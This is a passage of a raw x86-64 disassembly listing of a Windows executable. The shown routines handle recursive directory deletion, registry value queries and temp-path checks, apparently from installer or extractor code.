   140001e32:	48 ff 15 f7 73 00 00 	rex.W call *0x73f7(%rip)        # 0x140009230
   140001e39:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e3e:	4c 8d 05 c3 79 00 00 	lea    0x79c3(%rip),%r8        # 0x140009808
   140001e45:	8b d6                	mov    %esi,%edx
   140001e47:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140001e4b:	e8 b8 5f 00 00       	call   0x140007e08
   140001e50:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140001e54:	48 ff 15 dd 73 00 00 	rex.W call *0x73dd(%rip)        # 0x140009238
   140001e5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e60:	48 8b f8             	mov    %rax,%rdi
   140001e63:	48 85 c0             	test   %rax,%rax
   140001e66:	0f 84 cf 00 00 00    	je     0x140001f3b
   140001e6c:	48 8d 15 a5 79 00 00 	lea    0x79a5(%rip),%rdx        # 0x140009818
   140001e73:	48 8b c8             	mov    %rax,%rcx
   140001e76:	48 ff 15 03 74 00 00 	rex.W call *0x7403(%rip)        # 0x140009280
   140001e7d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e82:	48 85 c0             	test   %rax,%rax
   140001e85:	48 8b cf             	mov    %rdi,%rcx
   140001e88:	48 8b d8             	mov    %rax,%rbx
   140001e8b:	41 0f 95 c6          	setne  %r14b
   140001e8f:	48 ff 15 0a 74 00 00 	rex.W call *0x740a(%rip)        # 0x1400092a0
   140001e96:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e9b:	48 85 db             	test   %rbx,%rbx
   140001e9e:	0f 84 97 00 00 00    	je     0x140001f3b
   140001ea4:	8b d6                	mov    %esi,%edx
   140001ea6:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001eab:	48 ff 15 7e 73 00 00 	rex.W call *0x737e(%rip)        # 0x140009230
   140001eb2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001eb7:	85 c0                	test   %eax,%eax
   140001eb9:	74 13                	je     0x140001ece
   140001ebb:	4c 8d 05 9e 78 00 00 	lea    0x789e(%rip),%r8        # 0x140009760
   140001ec2:	8b d6                	mov    %esi,%edx
   140001ec4:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001ec9:	e8 3a 5f 00 00       	call   0x140007e08
   140001ece:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140001ed2:	4c 8d 2d 37 b7 00 00 	lea    0xb737(%rip),%r13        # 0x14000d610
   140001ed9:	48 8b c3             	mov    %rbx,%rax
   140001edc:	48 ff c0             	inc    %rax
   140001edf:	42 80 3c 28 00       	cmpb   $0x0,(%rax,%r13,1)
   140001ee4:	75 f6                	jne    0x140001edc
   140001ee6:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001eeb:	48 8b cb             	mov    %rbx,%rcx
   140001eee:	48 ff c1             	inc    %rcx
   140001ef1:	80 3c 0a 00          	cmpb   $0x0,(%rdx,%rcx,1)
   140001ef5:	75 f7                	jne    0x140001eee
   140001ef7:	48 83 c0 50          	add    $0x50,%rax
   140001efb:	48 03 c1             	add    %rcx,%rax
   140001efe:	b9 40 00 00 00       	mov    $0x40,%ecx
   140001f03:	8b d0                	mov    %eax,%edx
   140001f05:	8b f0                	mov    %eax,%esi
   140001f07:	48 ff 15 da 74 00 00 	rex.W call *0x74da(%rip)        # 0x1400093e8
   140001f0e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f13:	48 8b f8             	mov    %rax,%rdi
   140001f16:	48 85 c0             	test   %rax,%rax
   140001f19:	75 59                	jne    0x140001f74
   140001f1b:	21 44 24 28          	and    %eax,0x28(%rsp)
   140001f1f:	45 33 c9             	xor    %r9d,%r9d
   140001f22:	45 33 c0             	xor    %r8d,%r8d
   140001f25:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140001f2c:	00 
   140001f2d:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140001f32:	33 c9                	xor    %ecx,%ecx
   140001f34:	e8 f3 2f 00 00       	call   0x140004f2c
   140001f39:	eb 23                	jmp    0x140001f5e
   140001f3b:	48 8b 0d 2e bf 00 00 	mov    0xbf2e(%rip),%rcx        # 0x14000de70
   140001f42:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001f47:	44 8b c6             	mov    %esi,%r8d
   140001f4a:	48 ff 15 bf 74 00 00 	rex.W call *0x74bf(%rip)        # 0x140009410
   140001f51:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f56:	85 c0                	test   %eax,%eax
   140001f58:	0f 85 70 ff ff ff    	jne    0x140001ece
   140001f5e:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001f63:	48 ff 15 3e 72 00 00 	rex.W call *0x723e(%rip)        # 0x1400091a8
   140001f6a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f6f:	e9 8b 00 00 00       	jmp    0x140001fff
   140001f74:	41 8b c6             	mov    %r14d,%eax
   140001f77:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140001f7c:	83 f0 01             	xor    $0x1,%eax
   140001f7f:	4c 8d 05 ca a1 00 00 	lea    0xa1ca(%rip),%r8        # 0x14000c150
   140001f86:	89 05 94 a8 00 00    	mov    %eax,0xa894(%rip)        # 0x14000c820
   140001f8c:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140001f91:	45 85 f6             	test   %r14d,%r14d
   140001f94:	48 8d 05 bd a0 00 00 	lea    0xa0bd(%rip),%rax        # 0x14000c058
   140001f9b:	48 8b d6             	mov    %rsi,%rdx
   140001f9e:	48 8b cf             	mov    %rdi,%rcx
   140001fa1:	4c 0f 45 c0          	cmovne %rax,%r8
   140001fa5:	e8 12 f1 ff ff       	call   0x1400010bc
   140001faa:	48 ff c3             	inc    %rbx
   140001fad:	80 3c 1f 00          	cmpb   $0x0,(%rdi,%rbx,1)
   140001fb1:	75 f7                	jne    0x140001faa
   140001fb3:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001fb8:	48 8d 15 11 a8 00 00 	lea    0xa811(%rip),%rdx        # 0x14000c7d0
   140001fbf:	ff c3                	inc    %ebx
   140001fc1:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001fc7:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001fcb:	45 33 c0             	xor    %r8d,%r8d
   140001fce:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001fd3:	48 ff 15 9e 71 00 00 	rex.W call *0x719e(%rip)        # 0x140009178
   140001fda:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001fdf:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001fe4:	48 ff 15 bd 71 00 00 	rex.W call *0x71bd(%rip)        # 0x1400091a8
   140001feb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ff0:	48 8b cf             	mov    %rdi,%rcx
   140001ff3:	48 ff 15 96 72 00 00 	rex.W call *0x7296(%rip)        # 0x140009290
   140001ffa:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001fff:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   140002006:	48 33 cc             	xor    %rsp,%rcx
   140002009:	e8 e2 66 00 00       	call   0x1400086f0
   14000200e:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   140002015:	00 
   140002016:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000201a:	49 8b 73 28          	mov    0x28(%r11),%rsi
   14000201e:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   140002022:	49 8b e3             	mov    %r11,%rsp
   140002025:	41 5e                	pop    %r14
   140002027:	41 5d                	pop    %r13
   140002029:	5d                   	pop    %rbp
   14000202a:	c3                   	ret
   14000202b:	cc                   	int3
   14000202c:	cc                   	int3
   14000202d:	cc                   	int3
   14000202e:	cc                   	int3
   14000202f:	cc                   	int3
   140002030:	cc                   	int3
   140002031:	cc                   	int3
   140002032:	cc                   	int3
   140002033:	cc                   	int3
   140002034:	48 85 c9             	test   %rcx,%rcx
   140002037:	0f 84 ed 01 00 00    	je     0x14000222a
   14000203d:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002042:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002047:	55                   	push   %rbp
   140002048:	57                   	push   %rdi
   140002049:	41 57                	push   %r15
   14000204b:	48 8d ac 24 80 fe ff 	lea    -0x180(%rsp),%rbp
   140002052:	ff 
   140002053:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   14000205a:	48 8b 05 a7 9f 00 00 	mov    0x9fa7(%rip),%rax        # 0x14000c008
   140002061:	48 33 c4             	xor    %rsp,%rax
   140002064:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   14000206b:	80 39 00             	cmpb   $0x0,(%rcx)
   14000206e:	48 8b d9             	mov    %rcx,%rbx
   140002071:	0f 84 8d 01 00 00    	je     0x140002204
   140002077:	41 bf 04 01 00 00    	mov    $0x104,%r15d
   14000207d:	48 8d 45 60          	lea    0x60(%rbp),%rax
   140002081:	48 8b fb             	mov    %rbx,%rdi
   140002084:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140002088:	41 8b d7             	mov    %r15d,%edx
   14000208b:	48 2b f8             	sub    %rax,%rdi
   14000208e:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140002095:	48 85 c0             	test   %rax,%rax
   140002098:	74 12                	je     0x1400020ac
   14000209a:	8a 04 0f             	mov    (%rdi,%rcx,1),%al
   14000209d:	84 c0                	test   %al,%al
   14000209f:	74 0b                	je     0x1400020ac
   1400020a1:	88 01                	mov    %al,(%rcx)
   1400020a3:	48 ff c1             	inc    %rcx
   1400020a6:	48 83 ea 01          	sub    $0x1,%rdx
   1400020aa:	75 e2                	jne    0x14000208e
   1400020ac:	48 85 d2             	test   %rdx,%rdx
   1400020af:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400020b3:	4c 8d 05 6e 77 00 00 	lea    0x776e(%rip),%r8        # 0x140009828
   1400020ba:	49 8b d7             	mov    %r15,%rdx
   1400020bd:	48 0f 45 c1          	cmovne %rcx,%rax
   1400020c1:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400020c5:	c6 00 00             	movb   $0x0,(%rax)
   1400020c8:	e8 3b ef ff ff       	call   0x140001008
   1400020cd:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400020d2:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400020d6:	48 ff 15 2b 73 00 00 	rex.W call *0x732b(%rip)        # 0x140009408
   1400020dd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400020e2:	48 8b f0             	mov    %rax,%rsi
   1400020e5:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400020e9:	0f 84 15 01 00 00    	je     0x140002204
   1400020ef:	4d 8b c7             	mov    %r15,%r8
   1400020f2:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   1400020f6:	49 8d 88 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rcx
   1400020fd:	48 85 c9             	test   %rcx,%rcx
   140002100:	74 12                	je     0x140002114
   140002102:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   140002105:	84 c0                	test   %al,%al
   140002107:	74 0b                	je     0x140002114
   140002109:	88 02                	mov    %al,(%rdx)
   14000210b:	48 ff c2             	inc    %rdx
   14000210e:	49 83 e8 01          	sub    $0x1,%r8
   140002112:	75 e2                	jne    0x1400020f6
   140002114:	4d 85 c0             	test   %r8,%r8
   140002117:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000211b:	48 0f 45 c2          	cmovne %rdx,%rax
   14000211f:	f6 44 24 20 10       	testb  $0x10,0x20(%rsp)
   140002124:	c6 00 00             	movb   $0x0,(%rax)
   140002127:	74 6b                	je     0x140002194
   140002129:	48 8d 15 fc 76 00 00 	lea    0x76fc(%rip),%rdx        # 0x14000982c
   140002130:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   140002135:	48 ff 15 b4 72 00 00 	rex.W call *0x72b4(%rip)        # 0x1400093f0
   14000213c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002141:	85 c0                	test   %eax,%eax
   140002143:	0f 84 81 00 00 00    	je     0x1400021ca
   140002149:	48 8d 15 e0 76 00 00 	lea    0x76e0(%rip),%rdx        # 0x140009830
   140002150:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   140002155:	48 ff 15 94 72 00 00 	rex.W call *0x7294(%rip)        # 0x1400093f0
   14000215c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002161:	85 c0                	test   %eax,%eax
   140002163:	74 65                	je     0x1400021ca
   140002165:	4c 8d 44 24 4c       	lea    0x4c(%rsp),%r8
   14000216a:	49 8b d7             	mov    %r15,%rdx
   14000216d:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140002171:	e8 92 ee ff ff       	call   0x140001008
   140002176:	4c 8d 05 e3 75 00 00 	lea    0x75e3(%rip),%r8        # 0x140009760
   14000217d:	41 8b d7             	mov    %r15d,%edx
   140002180:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140002184:	e8 7f 5c 00 00       	call   0x140007e08
   140002189:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   14000218d:	e8 a2 fe ff ff       	call   0x140002034
   140002192:	eb 36                	jmp    0x1400021ca
   140002194:	4c 8d 44 24 4c       	lea    0x4c(%rsp),%r8
   140002199:	49 8b d7             	mov    %r15,%rdx
   14000219c:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400021a0:	e8 63 ee ff ff       	call   0x140001008
   1400021a5:	ba 80 00 00 00       	mov    $0x80,%edx
   1400021aa:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400021ae:	48 ff 15 c3 70 00 00 	rex.W call *0x70c3(%rip)        # 0x140009278
   1400021b5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021ba:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400021be:	48 ff 15 7b 70 00 00 	rex.W call *0x707b(%rip)        # 0x140009240
   1400021c5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021ca:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400021cf:	48 8b ce             	mov    %rsi,%rcx
   1400021d2:	48 ff 15 1f 72 00 00 	rex.W call *0x721f(%rip)        # 0x1400093f8
   1400021d9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021de:	85 c0                	test   %eax,%eax
   1400021e0:	0f 85 09 ff ff ff    	jne    0x1400020ef
   1400021e6:	48 8b ce             	mov    %rsi,%rcx
   1400021e9:	48 ff 15 b0 72 00 00 	rex.W call *0x72b0(%rip)        # 0x1400094a0
   1400021f0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021f5:	48 8b cb             	mov    %rbx,%rcx
   1400021f8:	48 ff 15 99 70 00 00 	rex.W call *0x7099(%rip)        # 0x140009298
   1400021ff:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002204:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   14000220b:	48 33 cc             	xor    %rsp,%rcx
   14000220e:	e8 dd 64 00 00       	call   0x1400086f0
   140002213:	4c 8d 9c 24 80 02 00 	lea    0x280(%rsp),%r11
   14000221a:	00 
   14000221b:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   14000221f:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140002223:	49 8b e3             	mov    %r11,%rsp
   140002226:	41 5f                	pop    %r15
   140002228:	5f                   	pop    %rdi
   140002229:	5d                   	pop    %rbp
   14000222a:	c3                   	ret
   14000222b:	cc                   	int3
   14000222c:	cc                   	int3
   14000222d:	cc                   	int3
   14000222e:	cc                   	int3
   14000222f:	cc                   	int3
   140002230:	cc                   	int3
   140002231:	cc                   	int3
   140002232:	cc                   	int3
   140002233:	cc                   	int3
   140002234:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002239:	57                   	push   %rdi
   14000223a:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140002241:	48 8b 05 c0 9d 00 00 	mov    0x9dc0(%rip),%rax        # 0x14000c008
   140002248:	48 33 c4             	xor    %rsp,%rax
   14000224b:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   140002252:	00 
   140002253:	bf 04 01 00 00       	mov    $0x104,%edi
   140002258:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000225d:	8b d7                	mov    %edi,%edx
   14000225f:	33 db                	xor    %ebx,%ebx
   140002261:	48 ff 15 08 70 00 00 	rex.W call *0x7008(%rip)        # 0x140009270
   140002268:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000226d:	85 c0                	test   %eax,%eax
   14000226f:	74 6a                	je     0x1400022db
   140002271:	4c 8d 05 c0 75 00 00 	lea    0x75c0(%rip),%r8        # 0x140009838
   140002278:	8b d7                	mov    %edi,%edx
   14000227a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000227f:	e8 84 5b 00 00       	call   0x140007e08
   140002284:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140002289:	45 33 c0             	xor    %r8d,%r8d
   14000228c:	33 d2                	xor    %edx,%edx
   14000228e:	33 c9                	xor    %ecx,%ecx
   140002290:	48 ff 15 c9 6f 00 00 	rex.W call *0x6fc9(%rip)        # 0x140009260
   140002297:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000229c:	8d 53 40             	lea    0x40(%rbx),%edx
   14000229f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400022a4:	48 ff 15 5d 6f 00 00 	rex.W call *0x6f5d(%rip)        # 0x140009208
   1400022ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022b0:	8b f8                	mov    %eax,%edi
   1400022b2:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400022b5:	74 24                	je     0x1400022db
   1400022b7:	33 d2                	xor    %edx,%edx
   1400022b9:	44 8d 43 02          	lea    0x2(%rbx),%r8d
   1400022bd:	8b c8                	mov    %eax,%ecx
   1400022bf:	48 ff 15 4a 6f 00 00 	rex.W call *0x6f4a(%rip)        # 0x140009210
   1400022c6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022cb:	8b cf                	mov    %edi,%ecx
   1400022cd:	8b d8                	mov    %eax,%ebx
   1400022cf:	48 ff 15 d2 6f 00 00 	rex.W call *0x6fd2(%rip)        # 0x1400092a8
   1400022d6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022db:	8b c3                	mov    %ebx,%eax
   1400022dd:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   1400022e4:	00 
   1400022e5:	48 33 cc             	xor    %rsp,%rcx
   1400022e8:	e8 03 64 00 00       	call   0x1400086f0
   1400022ed:	48 8b 9c 24 50 01 00 	mov    0x150(%rsp),%rbx
   1400022f4:	00 
   1400022f5:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   1400022fc:	5f                   	pop    %rdi
   1400022fd:	c3                   	ret
   1400022fe:	cc                   	int3
   1400022ff:	cc                   	int3
   140002300:	cc                   	int3
   140002301:	cc                   	int3
   140002302:	cc                   	int3
   140002303:	cc                   	int3
   140002304:	cc                   	int3
   140002305:	cc                   	int3
   140002306:	cc                   	int3
   140002307:	cc                   	int3
   140002308:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000230d:	53                   	push   %rbx
   14000230e:	48 83 ec 60          	sub    $0x60,%rsp
   140002312:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   140002317:	33 db                	xor    %ebx,%ebx
   140002319:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   14000231f:	89 5c 24 70          	mov    %ebx,0x70(%rsp)
   140002323:	45 33 c0             	xor    %r8d,%r8d
   140002326:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000232b:	48 8d 15 2e 9e 00 00 	lea    0x9e2e(%rip),%rdx        # 0x14000c160
   140002332:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140002339:	48 ff 15 18 6e 00 00 	rex.W call *0x6e18(%rip)        # 0x140009158
   140002340:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002345:	85 c0                	test   %eax,%eax
   140002347:	75 64                	jne    0x1400023ad
   140002349:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000234e:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140002353:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   140002358:	45 33 c9             	xor    %r9d,%r9d
   14000235b:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002360:	45 33 c0             	xor    %r8d,%r8d
   140002363:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140002368:	33 d2                	xor    %edx,%edx
   14000236a:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000236f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002374:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002379:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000237e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002383:	48 ff 15 d6 6d 00 00 	rex.W call *0x6dd6(%rip)        # 0x140009160
   14000238a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000238f:	8b 4c 24 70          	mov    0x70(%rsp),%ecx
   140002393:	85 c0                	test   %eax,%eax
   140002395:	0f 45 cb             	cmovne %ebx,%ecx
   140002398:	89 4c 24 70          	mov    %ecx,0x70(%rsp)
   14000239c:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400023a1:	48 ff 15 00 6e 00 00 	rex.W call *0x6e00(%rip)        # 0x1400091a8
   1400023a8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400023ad:	8b 44 24 70          	mov    0x70(%rsp),%eax
   1400023b1:	48 83 c4 60          	add    $0x60,%rsp
   1400023b5:	5b                   	pop    %rbx
   1400023b6:	c3                   	ret
   1400023b7:	cc                   	int3
   1400023b8:	cc                   	int3
   1400023b9:	cc                   	int3
   1400023ba:	cc                   	int3
   1400023bb:	cc                   	int3
   1400023bc:	cc                   	int3
   1400023bd:	cc                   	int3
   1400023be:	cc                   	int3
   1400023bf:	cc                   	int3
   1400023c0:	40 53                	rex push %rbx
   1400023c2:	48 83 ec 30          	sub    $0x30,%rsp
   1400023c6:	33 db                	xor    %ebx,%ebx
   1400023c8:	66 85 c9             	test   %cx,%cx
   1400023cb:	0f 84 a7 00 00 00    	je     0x140002478
   1400023d1:	66 83 f9 01          	cmp    $0x1,%cx
   1400023d5:	0f 84 96 00 00 00    	je     0x140002471
   1400023db:	0f 86 9e 00 00 00    	jbe    0x14000247f
   1400023e1:	66 83 f9 03          	cmp    $0x3,%cx
   1400023e5:	0f 87 94 00 00 00    	ja     0x14000247f
   1400023eb:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1400023f0:	89 5c 24 40          	mov    %ebx,0x40(%rsp)
   1400023f4:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   1400023fa:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400023ff:	45 33 c0             	xor    %r8d,%r8d
   140002402:	48 8d 15 17 9c 00 00 	lea    0x9c17(%rip),%rdx        # 0x14000c020
   140002409:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140002410:	48 ff 15 41 6d 00 00 	rex.W call *0x6d41(%rip)        # 0x140009158
   140002417:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000241c:	85 c0                	test   %eax,%eax
   14000241e:	75 4b                	jne    0x14000246b
   140002420:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002425:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000242a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000242f:	48 8d 15 d2 9c 00 00 	lea    0x9cd2(%rip),%rdx        # 0x14000c108
   140002436:	45 33 c9             	xor    %r9d,%r9d
   140002439:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000243e:	45 33 c0             	xor    %r8d,%r8d
   140002441:	48 ff 15 50 6d 00 00 	rex.W call *0x6d50(%rip)        # 0x140009198
   140002448:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000244d:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   140002451:	85 c0                	test   %eax,%eax
   140002453:	0f 45 cb             	cmovne %ebx,%ecx
   140002456:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   14000245a:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000245f:	48 ff 15 42 6d 00 00 	rex.W call *0x6d42(%rip)        # 0x1400091a8
   140002466:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000246b:	8b 5c 24 40          	mov    0x40(%rsp),%ebx
   14000246f:	eb 0e                	jmp    0x14000247f
   140002471:	e8 92 fe ff ff       	call   0x140002308
   140002476:	eb 05                	jmp    0x14000247d
   140002478:	e8 b7 fd ff ff       	call   0x140002234
   14000247d:	8b d8                	mov    %eax,%ebx
   14000247f:	8b c3                	mov    %ebx,%eax
   140002481:	48 83 c4 30          	add    $0x30,%rsp
   140002485:	5b                   	pop    %rbx
   140002486:	c3                   	ret
   140002487:	cc                   	int3
   140002488:	cc                   	int3
   140002489:	cc                   	int3
   14000248a:	cc                   	int3
   14000248b:	cc                   	int3
   14000248c:	cc                   	int3
   14000248d:	cc                   	int3
   14000248e:	cc                   	int3
   14000248f:	cc                   	int3
   140002490:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002495:	57                   	push   %rdi
   140002496:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   14000249d:	48 8b 05 64 9b 00 00 	mov    0x9b64(%rip),%rax        # 0x14000c008
   1400024a4:	48 33 c4             	xor    %rsp,%rax
   1400024a7:	48 89 84 24 40 01 00 	mov    %rax,0x140(%rsp)
   1400024ae:	00 
   1400024af:	48 8b f9             	mov    %rcx,%rdi
   1400024b2:	ba 04 01 00 00       	mov    $0x104,%edx
   1400024b7:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400024bc:	48 ff 15 ad 6d 00 00 	rex.W call *0x6dad(%rip)        # 0x140009270
   1400024c3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400024c8:	33 db                	xor    %ebx,%ebx
   1400024ca:	85 c0                	test   %eax,%eax
   1400024cc:	75 1e                	jne    0x1400024ec
   1400024ce:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400024d2:	45 33 c9             	xor    %r9d,%r9d
   1400024d5:	45 33 c0             	xor    %r8d,%r8d
   1400024d8:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400024df:	00 
   1400024e0:	ba f0 04 00 00       	mov    $0x4f0,%edx
   1400024e5:	33 c9                	xor    %ecx,%ecx
   1400024e7:	e8 40 2a 00 00       	call   0x140004f2c
   1400024ec:	8a 4c 24 30          	mov    0x30(%rsp),%cl
   1400024f0:	38 0f                	cmp    %cl,(%rdi)
   1400024f2:	0f 94 c3             	sete   %bl
   1400024f5:	8b c3                	mov    %ebx,%eax
   1400024f7:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
   1400024fe:	00 
   1400024ff:	48 33 cc             	xor    %rsp,%rcx
   140002502:	e8 e9 61 00 00       	call   0x1400086f0
   140002507:	48 8b 9c 24 60 01 00 	mov    0x160(%rsp),%rbx
   14000250e:	00 
   14000250f:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   140002516:	5f                   	pop    %rdi
   140002517:	c3                   	ret
   140002518:	cc                   	int3
   140002519:	cc                   	int3
   14000251a:	cc                   	int3
   14000251b:	cc                   	int3
   14000251c:	cc                   	int3
   14000251d:	cc                   	int3
   14000251e:	cc                   	int3
   14000251f:	cc                   	int3
   140002520:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002525:	57                   	push   %rdi
   140002526:	48 83 ec 50          	sub    $0x50,%rsp
   14000252a:	48 8b 05 d7 9a 00 00 	mov    0x9ad7(%rip),%rax        # 0x14000c008
   140002531:	48 33 c4             	xor    %rsp,%rax
   140002534:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002539:	33 db                	xor    %ebx,%ebx
   14000253b:	c7 05 ff af 00 00 70 	movl   $0x70,0xafff(%rip)        # 0x14000d544
   140002542:	00 00 00 
   140002545:	49 8b f9             	mov    %r9,%rdi
   140002548:	83 f9 01             	cmp    $0x1,%ecx
   14000254b:	75 3d                	jne    0x14000258a
   14000254d:	45 8d 0c 10          	lea    (%r8,%rdx,1),%r9d
   140002551:	4c 8d 05 ec 72 00 00 	lea    0x72ec(%rip),%r8        # 0x140009844
   140002558:	8d 53 0a             	lea    0xa(%rbx),%edx
   14000255b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002560:	e8 57 eb ff ff       	call   0x1400010bc
   140002565:	21 5c 24 28          	and    %ebx,0x28(%rsp)
   140002569:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000256e:	45 33 c9             	xor    %r9d,%r9d
   140002571:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140002578:	00 
